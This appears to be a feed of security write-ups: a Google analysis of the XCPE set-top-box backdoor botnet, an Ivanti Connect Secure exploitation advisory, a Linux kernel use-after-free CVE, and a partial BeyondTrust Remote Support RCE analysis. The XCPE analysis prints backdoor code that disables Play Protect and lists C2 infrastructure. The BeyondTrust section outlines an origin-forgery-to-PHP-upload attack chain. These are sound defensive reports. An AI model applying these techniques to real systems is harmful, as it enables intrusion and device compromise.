summary: Introduction Last week, Google and industry partners dismantled the XCPE backdoor which enrolled more than 1.3 million set-top boxes into a botnet. We assess with high confidence that the backdoor and botnet were intentionally developed, deployed, and operated for financial gain by Videostrong Technology Co., an Android Original Equipment Manufacturer (OEM) and Original Design Manufacturer (ODM). Videostrong monetized the backdoor by selling access to criminal affiliates and loading those affiliates’ malware modules onto infected devices. These secondary modules were conducting ad-fraud; silently enrolling infected devices into residential proxy networks; and loading additional malware onto XCPE-compromised devices. We also took action to disrupt the command and control (C2) domains that operate these affiliate modules. Because these affiliates each have diversified distribution channels for their modules beyond XCPE, we assess that taking down their C2 domains will sever access to at least 10 million additional compromised devices. We found this malicious software built directly into many different device models and brands over multiple years, supported by dedicated infrastructure and constantly evolving configurations to evade detection and manage their affiliates. We believe this campaign wasn’t an isolated rogue insider or a development oversight. As a result, Google has cut ties with Videostrong and banned them from making devices with preloaded Google apps. Google requires OEMs go through a comprehensive suite of compatibility and security tests to ensure a consistent and safe user experience across the Android ecosystem. However, Videostrong employed obfuscation techniques to exploit a gap in our tests and load malicious code after the device's first boot. As a result, Google has implemented changes to its existing review process to better safeguard against similar activity in the future. A device manufacturer intentionally infecting their users with malware is an unacceptable breach of trust, and represents a serious risk to those users. Without users’ knowledge or consent, infected devices were offered as a distribution mechanism for a wide array of criminal actors. This led to a variety of malicious activities being conducted on and through the devices, including ad-fraud, data exfiltration, and routing malicious network traffic through the devices. We worked closely with Japan’s National Police Agency, Lumen, HUMAN Security, Plume, Synthient, and TrendAI to analyze this malware ecosystem and disrupt its operations. While we expect this disruption to have a significant effect on these criminal operations, this is not the end of our work combatting malicious activity. Backdoor operators, ad-fraud rings, and residential proxy providers operate as an interconnected supply chain. Point-in-time disruptions are a critical tool to protect our users, but lasting disruption in this fluid ecosystem will require continued targeting of this infrastructure. Google undertook the following actions to support disruption of the XCPE botnet: Legal action to take down the domains and servers Videostrong used to control the botnet and install malware modules Legal action to take down C2 domains used by over a dozen malware families loaded as modules via this backdoor Banned Videostrong and any future subsidiaries or affiliates from building and selling certified Android devices in the future, or supplying software to other certified vendors Implementing improvements to how we ensure the integrity of firmware on certified Android TV devices Overview The x.cpe network was built for ongoing profit. By giving malware affiliates backdoor access, the operators conspired to monetize these devices long after purchase. Figure 1: XCPE malware overview Malware Since at least late 2024, Videostrong has evolved its pre-installed malware from simple single-stage droppers into a modular, three-stage architecture designed for resilience and multi-tenant monetization: Primary Backdoor: Operating at the android.uid.system privilege level, x.cpe (running as com.oemservice in some builds) is preloaded in the firmware partition. If uninstalled by a user, it automatically reinstalls from the /oem/ partition upon reboot, maintaining persistent system-level access. Its main function is to establish and facilitate communications between the C2 server and the loader and execution engine. Loader and Execution Engine: To evade security scans, x.cpe acts primarily as the C2 communicator and offloads module execution to an external loader, com.abc.nexus . This file employs native anti-analysis utilities to thwart sandbox detection, and configures and initializes the monetization modules. Most recently, com.abc.nexus has itself been phased out in favor of using more tailored dropper malware that loads and executes single modules. Monetization Modules: Videostrong monetizes its backdoored devices by loading monetization modules which are developed by entities other than Videostrong that act as affiliates. These modules are deployed as native ELF daemons, embedded SDKs compiled directly into the com.abc.nexus DEX bytecode, or are fetched as secondary APKs from the malware staging infrastructure. The loaded modules transform infected devices into residential proxy exit nodes (e.g., Linkfog, AppSalt, NetNut), ad-fraud engines (e.g., CBOXTV, HiddenView), or execute additional backdoors that load even more monetization modules (e.g. Moyu, Spirit). Infrastructure Command and Control: The botnet uses a two-stage C2 process. It first initiates HTTP POST requests to fetch dynamic configuration settings, geolocation data, and STUN server parameters. It then establishes a persistent, real-time Message Queuing Telemetry Transport (MQTT) connection to receive instructions for silent app installations, arbitrary shell commands, screen captures, and network reconnaissance. MQTT is a lightweight, publish-and-subscribe network protocol designed for low-bandwidth, high-latency, or unreliable remote networks. Malware staging infrastructure: Additional monetization modules as well as various shell scripts and legitimate applications are hosted remotely and downloaded by infected devices upon command from the operator via the MQTT broker. A significant majority of these files are hosted as Github releases on operator-owned Github pages. Other files are hosted on operator-controlled servers and file hosting sites. Malware Deep Dive Backdoor Initialization The infection chain begins with a stub package (called x.cpe in some builds and com.oemservice in others) preloaded in the system partition of the firmware and running at the android.uid.system privilege level. This stub has limited functionality. Upon boot, it checks the device's oem/ directory for the corresponding x.cpe package and initiates installation into the /data/app/ directory as outlined below. To maintain inter-process state across the firmware ecosystem, x.cpe exports two ContentProviders, which expose structured configuration tables storing runtime parameters, device identifiers, proxy configuration blobs, and execution flags accessible by co-installed system applications. This enables other apps in Videostrong’s ecosystem, such as their YokaTV Player streaming software, to fetch configuration parameters provided by the C2 server mentioned below. C2 Configuration The malware utilizes a two-stage communications protocol. It first fetches initial bootstrap configurations via an HTTP request, followed by a persistent MQTT subscription to receive commands and module download instructions. To dynamically derive the HTTP C2 bootstrap server, it follows the following routine: Queries content://com.release.debug.provider/configs for private_url via x.cpe.util.ExtraReadUtils . Queries the Android system property to determine if ro.mecool.device is true. If true, it defaults to http://mcstb.anyevonline.com:8000 If false, it dynamically generates the following: http://stb[AndroidVersion][Type].anyevonline.com:8000 . Using the selected hostname, the client makes an HTTP POST request with an AES-encrypted JSON object containing hardware telemetry (SN, MAC, model, firmware version) to the following endpoints: /router/config/mqtt : This endpoint provides MQTT broker details (including Broker Hostname, TCP Port, Authentication Tokens/Passwords, and the specific Topic structure: /device/{model}/{chipId}/{action} . After receiving this data, the device initiates a persistent, real-time socket connection to the MQTT broker. /router/config/acs : This endpoint response returns URLs for ip-api[.]com and a Google STUN server to enable the malware to identify geolocation and public IP and port mapping to traverse network address translation (NAT) boundaries. It also returns a URL ( http://ott.szbboys[.]com:8000/cpe/file/upload for uploading files, logs, or diagnostic dumps from the device, and returns flags to configure ad modules ( adBwmActive , adDevourUse , adDevourCode ), and to enable or disable core malware modules. /router/config/app : This endpoint provides module-level configs, including server mappings and parameters, which x.cpe decrypts and passes to a SQLite ContentProvider named ShareProvider ( com.oem.share.provider ). By exposing this inter-process data interface, x.cpe enables modules to retrieve up-to-date upstream infrastructure parameters (such as URLs for additional configs, user manuals, etc). MQTT Capabilities Following initial configuration, persistent real-time C2 communication is managed by the MQTT library ( x.cpe.mqtt.MqttUtils ). All identified samples analyzed to date utilize a single broker hostname, mqtt.szbboys[.]com . Specific MQTT topics are mapped to specific actions, including: Silent Application Installation : Fetches remote APKs to a temporary directory. Disable Google Play Protect : To bypass security, AppUtils.disablePackageVerify() targets the global setting " package_verifier_user_consent " via Settings.Global.putInt and sets it to -1 , disabling Google Play Protect app verification. Arbitrary Shell Execution : Executes remote commands via sh under system UID privilege level. Results are published to the MQTT broker. Shell Script Execution : Downloads and executes shell scripts via x.cpe.util.RunCmds . Remote Desktop Monitor & Screen Capture : Utilizes android.app.Instrumentation.sendKeyDownUpSync() to inject keycodes and Java reflection on hidden APIs ( android.view.SurfaceControl.screenshot / SurfaceControl$ScreenshotHardwareBuffer ) to continuously capture the screen, compress to JPEG, and publish over MQTT. Network Reconnaissance : Invokes embedded binaries ( libtraceroute.so ) to fingerprint the victim network, and perform standard ping tests. The binaries also perform robust AS-lookup WHOIS routing queries. Our analysis of the C2 data indicates the preponderance of interactions with victim devices were related to module install, uninstall, and configuration actions. We also observed Videostrong operators executing sensitive actions on the device, including capturing live screenshots; injecting keystrokes; exfiltrating sensitive data including account information, device information, package inventories, and system logs; and executing shell scripts and commands, including to establish reverse shells on devices. Loader and Execution Engine Details Earlier versions of x.cpe directly embedded malicious monetization modules. In late 2024 – possibly as a response to earlier Google enforcement related to BadBox – Videostrong removed malicious modules from x.cpe and introduced a separate malicious package they developed, com.abc.nexus , which x.cpe routes instructions and data to via Inter-Process Communication (IPC). Modern variants of x.cpe facilitate C2 communications but pass configuration parameters, module updates, and other payloads to com.abc.nexus as the execution engine. We believe the actor may have evolved the malware in this way in an attempt to ensure x.cpe could remain undetected. Upon boot, com.abc.nexus.broadcast.BootReceiver broadcasts the com.abc.nexus.data intent, bootstrapping com.abc.nexus.service.CoreService . Within CoreService.onCreate , the application performs maintenance and persistence tasks. The main logic sets up a listener through RemoteMessageHandler for IPC communications from x.cpe, and parses JSON payloads received from it. After these steps, CoreService initializes the monetization modules. com.abc.nexus services extract and orchestrate a series of nested native libraries and dynamically downloaded secondary payloads which vary significantly based on sample. Many versions of com.abc.nexus come preloaded with four or more embedded modules, while other versions contain as few as one. The most common malware modules include TitanService , BwmService , AdtimeService , lb102Service , and LinkfogService (sometimes called AgentService) . Discussion of these and other modules can be found in the monetization modules section. Persistence and Evasion The malware operators implement a number of mechanisms to establish persistence and thwart detection and analysis. As a system preload, x.cpe cannot be removed by the user. If x.cpe is uninstalled from /data/app/ , upon reboot the x.cpe service BootReceiver follows the same routine outlined above and reinstalls the package. The backdoor is able to silently download additional files to the device and execute them without user consent because it first wipes user consent configuration on the device and then disables Google Play Protect: public static void disablePackageVerify() { PreferenceUtils.setPackageVerifyFromUser(CPEApp.instance, true); AppUtils.setPackageVerify(-1); // Actioning a bypass against GPP evaluation } Figure 2: Disabling Google Play Protect In many variants of com.abc.nexus, we observed the extraction of a sophisticated anti-analysis and process hardening utility libseccomp_guard.so , which runs prior to the initialization of malware modules, to ensure they remain protected from automated sandboxes and security instrumentation. It filters system calls to prevent the pausing or termination of individual threads, denies cross-process interference to ensure isolation, and prevents the spawning of child processes. Evolution Since August 2026, new dropper packages have been installed via the MQTT channel, which appear to be synchronized with the mass-uninstallation of com.abc.nexus across the botnet. We assess this may represent a new evolution of the malware to further evade detection. These new packages are disguised as Android system applications, with names such as com.android.system.ntp and com.android.sso.auth.handler . Where com.abc.nexus could act as a general purpose loader and execution engine (executing instructions passed to it from x.cpe ), these packages instead install single monetization modules (such as AppSalt). Multiple variants of these packages extract a native ELF file, libexploit.so , which in turn executes functions nativeAdbRoot() and nativeAdbShell() . These functions restart the local adbd service as root, and initiate an ADB shell connection. Following this, the app uses the connection to install itself in the system partition. The system partition is remounted as read-write and the payload replicates itself to a newly minted directory in /system/priv-app/ and creates an XML file at /system/etc/permissions/privapp-permissions-<app name>.xml . This file grants the malware android.permission.INSTALL_PACKAGES and android.permission.REBOOT . The app configures the malware modules through hardcoded configuration parameters, and does not listen for x.cpe IPC messages. The app itself is controlled by the operators via shell scripts pushed via the broker and executed by x.cpe . These include setting the property persist.networkstack.uninstall (which, when read by the app, triggers uninstallation and cleanup), persist.networkstack.skip_system_install (which skips system installation, forcing it to remain running in /data/app/ ), and persist.networkstack.install_time (which implements timestomping, overriding the default timestamp of the app to align with the other packages installed in the system directory). Botnet composition The botnet is globally dispersed, with certain concentrations possibly implying market penetration for the brand distributor. Figure 3: Global distribution of x.cpe While the overwhelming majority of the infected devices in the XCPE botnet are Android TV set-top boxes, we observed a number of other infected Android-based IoT devices, including telehealth devices, karaoke machines, and digital signage devices. Monetization x.cpe loads a variety of malicious modules for monetization. Most often the modules are associated with residential proxy services and bandwidth sharing, but we've also observed ad fraud modules. Given that a single device may be running multiple modules providing the same or similar functionality (e.g., as many as three residential proxy SDKs installed on a single device) it is clear that Videostrong seeks to monetize every infected device to the greatest extent possible. Services are loaded by com.abc.nexus via three methods: Native Daemons : Native ELF binaries prepackaged with com.abc.nexus , which are unpacked to data directories and spawned as background processes with system/root privileges. Embedded SDKs / Services : Java/Kotlin SDKs compiled directly into Nexus and invoked via Android Service lifecycles or IPC broadcast triggers. Dynamic Droppers & Secondary APK Installers : Downloader function that pulls remote native ELFs or secondary standalone APKs and invokes system package managers. Nexus receives messages from x.cpe directing it to download specific modules. Malware modules loaded via the backdoor include the following: Residential Proxy / Bandwidth Sharing Modules LINKFOG Com.abc.nexus ’s LinkfogService unpacks a Go binary named lw_android_agent from assets/ to local app storage and supplies it with vendor parameters. This service silently turns infected devices into residential edge computing and PCDN proxy exit nodes. It connects to FRP reverse tunnels, and uploads bandwidth accounting metrics to Linkfog API backends. Linkfog (operated by Beijing Linkfog Technology via 点心云 / Dianxinyun) brands itself as a “Peer-to-Peer Content Delivery Network”. Jaguar The com.abc.nexus AdtimeService extracts libjaguar.so from assets/ . The file is an unobfuscated 32-bit ELF binary written in C, compiled as a native Android binary. It utilizes JNI (Java Native Interface) to initialize its core routines, dynamically derives a ChaCha20 decryption key via ARM NEON SIMD instructions to decode heavily obfuscated configurations , and establishes an encrypted C2 channel. Upon successful registration, the C2 responds with JSON configuration specifying proxy endpoints. The proxy command loop x_ctrl_do_ctrl_msg delegates proxy operations based on incoming JSON variable commands, and is capable of both TCP and UDP relay. AppSalt / Honeygain AppSalt SDK is the residential proxy SDK owned by Honeygain, which is in turn owned by Oxylabs. com.abc.nexus.service.CoreService initializes Appsalt SDK. First, the application obtains an Appsalt SDK API key from a native library libnative_keys.so by calling its getAppsaltKey() function. Appsalt SDK is initialized without displaying a consent screen - instead it explicitly calls the optIn() method which sets a consent flag without displaying any user interface. During Appsalt SDK startup it checks the application's installation source and stops execution if the application was installed from the official Google Play Store. Once Appsalt is successfully initialized it establishes a WebSocket connection with the primary command and control domain. Appsalt uses JSON-formatted messages for initial check-in (registration) and heartbeat requests. Appsalt command and control servers use MessagePack formatted messages to issue commands pertaining to proxy operations. Appsalt SDK is configured with an initial set of domains that act as proxy gateways. The list of proxy gateways can be updated by the command and control server. The device establishes UDP / QUIC connections with these gateways. BWM / IPWeb This residential proxy and bandwidth-sharing node is implemented through the com.abc.nexus.service.BwmService component (sometimes named com.abc.nexus.service.SN4Service) and its associated SDK. Upon initialization, it secures itself within an isolated sandbox environment, captures device telemetry, and registers with a remote server over UDP. From this C2, it receives instructions to initiate a Java NIO TCP multiplexed proxy tunnel. The service functions to route arbitrary traffic through the infected device on behalf of a remote threat actor. GaGaNode GaGaNode is the first-party SDK owned by residential proxy operator IPCola. It connects over TCP to a primary C2 server and sends heartbeat beacon data over HTTP POST to a separate server. The SDK both contains its own proxy relay functionality, and it initializes additional proxy SDKs from affiliates. Upon device registration to the C2, com.gaganode.sdk.node.endpoint.a receives incoming packets from relay servers and places them in queue for the client to read and proxy through its exit node socket. The service manages multiple proxy sessions at once (referred to as clients), and each client has its own tcp/udp queue for messages. We observe GaGaNode initializing PopaNet/NetNut and EarnFM Fleet residential proxy SDKs. GaGaNode/IPCola is thus likely able to further monetize its SDK and offer these affiliates access to the infected exit nodes. NetNut / Popanet Popanet is a residential proxy SDK developed by NetNut, a residential proxy operator. The GaGaNode module initiates the Popanet SDK ( io.popanet.Popa ). This malware is identical to the malware described in our previous disruption of NetNut . All C2 infrastructure used by Popanet samples connected to x.cpe was taken down as part of the earlier Netnut disruption. Traffmonetizer The Traffmonetizer SDK is initialized inside the primary background service com.abc.nexus.service.CoreService . CoreService operation depends on the availability of policy JSON provided by the XCPE backdoor via IPC. Before calling Traffmonetizer SDK initialization methods, the application obtains a Traffmonetizer SDK API key from the native library libnative_keys.so by calling its getTraffmonetizerKey() function. Traffmonetizer functionality is split between two components where the Android SDK acts as a state machine which handles native library callbacks through asynchronous event dispatchers. ServiceBloc monitors connection status updates from the native callbacks and ConnectivityBloc monitors Wi-Fi and mobile data network changes. Traffmonetizer native library initialization and configuration is followed by a call to baseClientStart() which establishes a WebSocket connection to a C2 server. Traffmonetizer uses a single WebSocket (TLS) connection to the command and control server to multiplex control messages and tunneled connections (supports both TCP and UDP). Traffmonetizer also supports “Content Delivery” tunneling which allows nodes to tunnel bandwidth-intensive traffic. EarnFM EarnFM is a residential proxy provider, and Fleet SDK is the provider’s SDK that enrolls devices as exit nodes into the proxy network. In com.abc.nexus , FleetSDK is initialized by com.gaganode.sdk as mentioned above. FleetSdk then loads native binary libfleetshare.so . FleetSDK establishes a persistent WebSocket connection with its primary C2 server for routing arbitrary network traffic. Incoming tasking frames are received over the WebSocket channel and processed in a continuous loop. Messages contain structured JSON commands instructing the daemon to connect to specific remote hosts, with support for both TCP and UDP. Backdoor Modules Spirit Spirit is a dynamic code loading backdoor. Spirit employs multiple stages. The first stage payload fetches device information (hardware, operating system, and manufacturer/brand information and geolocation), posting it over HTTP to a hardcoded C2 server, and fetches a list of additional modules to download from the server. The second stage communicates with a separate server, and is used for tasking, config sync, module retrieval, heartbeats, and reporting. We have observed Spirit loading a significant amount of additional malware monetization modules, including some of the families already directly loaded by com.abc.nexus . Moyu Moyu is a 3-stage backdoor previously observed as part of the BadBox enterprise. On x.cpe -backdoored devices, we observed it initialized by com.abc.nexus.service.DevourService. The first stage is an offline dropper that reconstructs and loads an embedded second stage. Stage two polls an update C2 to download, decrypt, and load the third stage. Stage three implements a backdoor with hidden Double-WebView click/conversion fraud, persistent clipboard hijacking, and secondary dynamically loaded JAR execution and a separate residential proxy trojan. Bird Bird is a 2-stage backdoor previously tied to the BadBox enterprise. Stage 1 beacons a device and analysis-environment profile to its C2 server and, when the server approves, downloads, decrypts, and loads the Stage 2 JAR. Stage 2 implements a dynamic code loading backdoor (two plugin loaders plus a C2-driven reflective method invoker), a separate downloader (silent APK installation and Accessibility-driven Google Play installs), and ad abuse (lockscreen ads, overlays, browser launches). Fission Fission is a dynamic code loading (DCL) backdoor embedded within standard video applications (e.g., com.newtv.cboxtv ). Upon initialization, the first stage plugin contacts its C2 server to download additional modules. The decrypted second stage payload fetches execution targets and tracking URLs from the C2. The request sends an unencrypted POST request with tracking metrics from the internal DeviceManager. The payload we observed was configured to commit ad fraud. Rather than rendering visible advertisements in a WebView or UI component, the Stage 2 plugin executes headlessly in the background. The module queries ad server endpoints in the background to retrieve ad placement responses, parses out both primary impression beacons ( pvm ) and third-party tracking monitor URLs ( pvtpm ), and immediately fires HTTP GET requests to each tracking endpoint to register a fake ad view without displaying creative content. When executing inside specific smart-TV application stores ( com.changhong.appstore or com.tcl.appmarket2 ), the plugin initializes and triggers the ad SDK directly to report synthetic ad exposures. Ad-Fraud HiddenView We observed HiddenView loaded remotely from the attacker’s Github channel as com.ota.service . It is a standalone ad fraud application capable of running in the background using a transparent window overlay, using hidden WebViews to load targeted web pages and simulate user interaction (scrolling, clicking, typing, media playback), playing media unattended, and capturing the user’s screen. How the pieces come together Configuration messages pushed via MQTT (action ext/lib/config ) demonstrate how x.cpe , com.abc.nexus and various monetization modules function together. Upon registration, subscribed devices receive a ext/lib/config message, which contains configuration parameters for malicious plugins. When com.abc.nexus acknowledges receiving the bundle, x.cpe immediately publishes ext/lib/config/reply back to the MQTT broker: "code": 0, "msg": "success", "data": "received data success and applying", "async": true, "immediately": false Figure 8: x.cpe response payload Infrastructure As previously mentioned, devices first connect to various endpoints on *.anyevonline[.]com for initial bootstrap, registration, and configuration. Earlier malware versions used various hostnames of {*tms | *ott | *ota}.szbboys[.]com for the same purpose. While earlier versions of the malware used HTTP for C2, and then a blended C2 approach with both HTTP and MQTT, static analysis of current versions indicate they exclusively send/receive C2 communications via MQTT. A single MQTT broker orchestrates all MQTT C2 communications for samples we’ve identified. Hostname mqtt.szbboys[.]com is resolved by hosts 219.134.163[.]210 and 219.134.163[.]211. It listens on non-standard MQTT ports 3885-3887. The malware constructs OkHttp requests for file downloads after tasking via the MQTT broker. Files are hosted on several services: Several Github release pages The filemail[.]com file sharing service Two operator-controlled servers hosted on IPs 38.145.197[.]135 and 23.94.49[.]57 Netflow telemetry on the broker nodes ( 219.134.163[.]210/.211 ) indicates that while infected devices communicate over ports 3885–3887, operators likely manage the broker and dispatch tasking via interactive HTTP REST API (port 8082), WebSocket (port 8083), and EMQX web administration console (port 18083) sessions originating from non-bot IP space. Call to Action While we believe our actions have seriously impacted over a dozen malicious actors, the underlying illicit market is resilient. Backdoor operators, ad-fraud rings, and residential proxy providers operate as an interconnected supply chain, and when one component is disrupted, operators quickly pivot to new loaders or rival monetization SDKs. Creating lasting change requires accountability across the hardware supply chain, the residential proxy industry, and the broader technology ecosystem. Accountability and Reform A device manufacturer intentionally infecting their users with malware is an unacceptable breach of trust. By turning everyday hardware into persistent beachheads for criminal affiliates, Videostrong prioritized illicit post-sale recurring revenue over the safety and privacy of its users. Downstream hardware brands, white-label resellers, telecommunications providers, and online e-commerce marketplaces also share responsibility for closing this vector. Retailers and distributors should require independent security audits from Original Design Manufacturers (ODMs) and swiftly delist manufacturers implicated in supply-chain abuse. Residential proxy providers have been able to flourish under the guise of legitimate businesses. While some providers may claim to behave ethically and only enroll devices with the clear consent of consumers, any claims of "ethical sourcing" must be backed by transparent, auditable proof of user consent. In our analysis, these proxy operators only seek consent when they are forced due to platform policy and enforcement. Silent opt-in without user consent remains the most prevalent means by which devices are turned into exit nodes. Empowering and Protecting the Consumer Residential proxies are an understudied area of risk for consumers, and more can be done to raise awareness. Consumers should be extremely wary of applications that offer payment in exchange for "unused bandwidth" or "sharing your internet." These applications are primary ways for illicit proxy networks to grow, and could open security vulnerabilities on the device’s home network. We urge users to stick to app stores you trust, review permissions for third-party VPNs and proxies, and ensure built-in security protections like Google Play Protect are active. Consumers should only purchase connected devices, such as set-top boxes, from reputable manufacturers. Our Android TV website provides the most up-to-date list of partners. Industry Collaboration We encourage mobile platforms, ISPs, online marketplaces and other tech platforms to continue sharing intelligence and implementing best practices to identify malicious backdoors, illicit proxy networks, and other harmful software and limit their harms. summary: Overview On October 29, 2026, Ivanti updated its security advisory for Ivanti Connect Secure (ICS) to include two additional vulnerabilities and released fixes for both. Ivanti rates CVE-2026-111357 , a missing authentication for critical function vulnerability ( CWE-306 ), with a CVSSv3.1 score of 8.8 ; it allows a local authenticated attacker to escalate privileges. CVE-2026-118527 , classified as generation of predictable numbers or identifiers ( CWE-340 ), has an Ivanti-assigned CVSSv3.0 score of 4.3 and, according to CISA's KEV entry , allows a remote authenticated attacker to upload attacker-controlled content to a known location on disk. Per Ivanti, exploitation in the wild has already occurred prior to disclosure, affecting a limited number of customers when these flaws are chained with CVE-2026-104935 , an authentication bypass by spoofing ( CWE-290 ). Rapid7 covered the original disclosure on October 13, 2026 , when a fix for CVE-2026-104935 was available but the privilege escalation component remained unpatched. Fixes are now available for all three vulnerabilities. On October 30, 2026, CVE-2026-111357 and CVE-2026-118527 were added to the U.S. Cybersecurity and Infrastructure Security Agency's (CISA) list of known exploited vulnerabilities (KEV), based on evidence of active exploitation. The following scores and classifications are from Ivanti's updated advisory: CVE Ivanti CVSS score CWE Impact CVE-2026-104935 8.6 (High), CVSSv3.0 CWE-290 Remote unauthenticated command execution CVE-2026-111357 8.8 (High), CVSSv3.1 CWE-306, CWE-862, CWE-345 Local authenticated privilege escalation CVE-2026-118527 4.3 (Medium), CVSSv3.0 CWE-340 Remote authenticated file upload to a known path Note: The CVE record and Rapid7's vulnerability database rate CVE-2026-111357 at 7.0 , using high attack complexity and unchanged scope. Ivanti assesses low attack complexity and changed scope, resulting in its score of 8.8. The table follows Ivanti's scores and classifications. In its investigation , Volexity reports that UTA0576 used an exploit chain to gain unauthenticated root access to an appliance running 22.8R2.4 , beginning on October 3, 2026. Its write-up identifies CVE-2026-104935 and CVE-2026-111357; Ivanti's updated advisory identifies CVE-2026-118527 as an additional component of the chain. Volexity observed credential theft and Active Directory queries for Windows LAPS passwords and BitLocker recovery keys. The combined impact warrants emergency remediation despite the individual CVSS ratings. Ivanti Connect Secure is an enterprise VPN solution deployed at the network edge and has a history of zero-day exploitation, including in 2024 and 2025 . Mitigation guidance Rapid7 recommends applying the available updates on an emergency basis outside of normal patching cycles. The October 13 fixes in 25.1.1.2 and 22.8R2.5 do not remediate CVE-2026-111357 or CVE-2026-118527. CVE(s) Affected versions Fixed version(s) CVE-2026-111357 and CVE-2026-118527 25.1.1.2 and prior 25.1.1.3 CVE-2026-111357 and CVE-2026-118527 22.8R2.5 and prior 22.8R2.6 CVE-2026-104935 25.1.1.1 and prior 25.1.1.2 CVE-2026-104935 25.1.2.2 and prior 25.1.3.0 , 25.1.3.1 CVE-2026-104935 22.8R2.4 and prior 22.8R2.5 Ivanti recommends moving from 22.8.X to 25.1.1.3 or later, or applying 22.8R2.6 if migration is not immediately possible. Ivanti lists 25.1.3.0 and later on ISA4500, ISA6500, or ISA8500 as unaffected. Rapid7 also recommends investigating for compromise after patching. Volexity reports that the observed activity evades Ivanti's Integrity Checker Tool, so a clean result does not rule out compromise. Preserve memory and logs before rebooting or resetting where feasible. If compromise is suspected, follow Ivanti's recovery steps and rotate potentially exposed credentials. For current fixed versions and mitigation guidance, refer to Ivanti's security advisory . Its linked recovery procedure includes older release references. Artifacts, evidence sources, and IOCs The following guidance and artifacts are from Volexity's investigation: Hunting guidance: Review requests to /dana-na/auth/url_default/welcome.cgi , especially URL/header mismatches involving X-DSCGI-PATH . Observed values include: X-DSCGI-PATH: /home/webserver/htdocs/dana/fb/smb/wu.cgi X-DSCGI-PATH: /home/runtime/tmp/<MD5(filename)> Evidence sources on the appliance: /tmp/ : ml.py , rq5.py , mk.py , rr.py , pu.txt , sp_out.txt , and spray_hits.json . /data/.icscap/ : dsstatmond , cap* , and h.py . /home/runtime/tmp/ : ics-root-run-inband-*.pl and ics-root-result-inband-* . /home/runtime/dlogs/debuglog and /var/log/audit/audit.log : investigate evidence of selective deletion. Network IOCs: 108.165.147[.]64 : UTA0576 exploitation IP, per Volexity's IOC list . Volexity also provides YARA rules for request-header evidence and the privilege escalation payload in memory. Rapid7 customers Exposure Command, Vulnerability Management, and Nexpose Exposure Command, Vulnerability Management, and Nexpose customers can assess exposure to CVE-2026-111357 and CVE-2026-118527 with authenticated vulnerability checks available since the 2026-10-30 content release. Updates November 2, 2026 : Initial publication.

summary: CVSSv3 Score: 9.8 CVE-2026-98432:ipv4: free inet_opt and ireq_opt after an RCU grace period tcp_v4_syn_recv_sock() transfers ownership of ireq->ireq_opt to the child socket (newinet->inet_opt) without copying it. Another cpu can concurrently process a retransmitted SYN for the same request socket, and send a SYNACK from tcp_check_req(). tcp_v4_send_synack() and inet_csk_route_req() read ireq->ireq_opt under rcu_read_lock() only, and ip_build_and_send_pkt() and ip_options_build() then read opt->optlen twice. Note that the SYNACK timer itself is not an issue: it holds a reference on its request socket, and inet_csk_reqsk_queue_drop() calls timer_delete_sync() before the child can be freed. Since commit 079096f103fa ("tcp/dccp: install syn_recv requests into ehash table"), request sockets are processed without holding the listener lock, so nothing prevents the child socket from being freed while the SYNACK is still being built. TCP child sockets do not have SOCK_RCU_FREE, and inet_sock_destruct() frees inet_opt with a plain kfree(), leading to a use-after-free in ip_options_build(). A similar issue exists with request socket migration (net.ipv4.tcp_migrate_req=1, or a BPF_SK_REUSEPORT_SELECT_OR_MIGRATE program). reqsk_timer_handler() clones the request socket with inet_reqsk_clone(), so that the old request socket and its clone share the same ireq_opt, then reqsk_migrate_reset() clears the pointer in the old one. Another cpu holding a reference on the old request socket can still be using these options (sending a SYNACK, or creating a child in tcp_v4_syn_recv_sock()) when the clone is freed, and tcp_v4_reqsk_destructor() also uses a plain kfree(). Readers already use RCU, and other paths replacing inet_opt (do_ip_setsockopt(), cipso_v4_sock_setattr()...) already use kfree_rcu(). Use kfree_rcu() in inet_sock_destruct() and tcp_v4_reqsk_destructor() as well. IPv6 is not affected by the first issue, because tcp_v6_syn_recv_sock() duplicates the options. tcp_v6_reqsk_destructor() has the same migration issue with ipv6_opt, which is only set by CALIPSO. This will be addressed in a separate patch. Revised on 2026-11-24 00:00:00

summary: Overview An origin-validation flaw in BeyondTrust Remote Support lets an unauthenticated attacker write files on the appliance and execute code as the site's operating-system user. The entry point is the public customer connection used to start a support session. No account credentials or user interaction are required. The flaw sits between the internal message router, brain , and an appliance-side customer worker, thin-scc . An attacker can put a reserved local router ID into a message's source address. The router forwards the message, and the worker accepts that address as proof that the request came from a local component. This gives the attacker access to an internal file-transfer service, including its native filesystem provider. We first confirmed the file write then used the primitive to upload a PHP file to the site's public directory. Requesting that file gave us code execution as the site user. A Metasploit module now implements the chain with PHP and Unix Command targets. We tested Remote Support 24.1.2, build 1524046 , revision 4208-ddcf90715106aa0c0e19c103f8d2c412af4beff3 . The test appliance had public issue-menu session starts and thin chat enabled (default). Other affected releases and fixed builds have not been established. The VM's base appliance version of Secure Remote Access, 7.1.0 , is separate from the Remote Support application version. Impact The attacker controls both the contents of an uploaded file and its destination path, subject to the worker's filesystem permissions. The same origin forgery also reaches the file-send operation. We used it to retrieve /proc/self/environ to determine the base installation path of the Remote Support before dropping the payload On the tested appliance, the native file service could write into the PHP document root. The Metasploit module returns code execution in the context of msfuser , UID 1000, which establishes unauthenticated remote code execution as the site user. Technical Analysis We will demonstrate how an attacker can start an anonymous session and then forge a message that the appliance will accept as local. Then outline how we can reach the native file transfer service, choose the uploaded file’s contents and destination and turn the file write into PHP execution. Addresses use Ghidra image base 0x100000 . Subtract that value for the raw ELF virtual address. Function names beginning with FUN_ are Ghidra labels; descriptive names are taken from diagnostic strings where available. Starting an anonymous customer session We begin by obtaining two customer keys from POST /api/start_session . These are fresh public guest sessions. The keys let the client use the customer transport, but do not identify a logged-in account. Each guest connects through the /nw WebSocket endpoint, using either the native or thin customer protocol. source/app/write_app_chooser_config: echo "ingredi support desk customer:|$BG_app_root/data/tmp/brain.sock" # [A1] echo "ingredi support desk customer thin:$BG_app_root/app/thin-scc-wrapper" # [A2] app/write_app_chooser_config shows where the two customer protocols go. The native protocol reaches the brain socket at [A1] ; the thin protocol launches a wrapper at [A2] . source/app/thin-scc-wrapper: # ... omitted: protocol parsing and the alternative debug-site branch ... quoted=$(export PHPRC="$BG_app_root/config/php-cli.ini"; echo $gskey | $ingrediRoot/app/dbquote) if [[ $(echo "SELECT COUNT(1) FROM gw_sessions WHERE session_key = $quoted AND session_type = 'sdcust' AND (expiration IS NULL OR expiration>NOW())" | $db) != "1" ]]; then # [A3] echo "1 failure" >&0 exit 0 fi # ... omitted: reconnect throttling, customer-name setup, and settings generation ... app/thin-scc-wrapper checks that the thin customer's key belongs to an unexpired sdcust session at [A3] . A key obtained through the public session-start endpoint passes this check. app/thin-scc-wrapper , 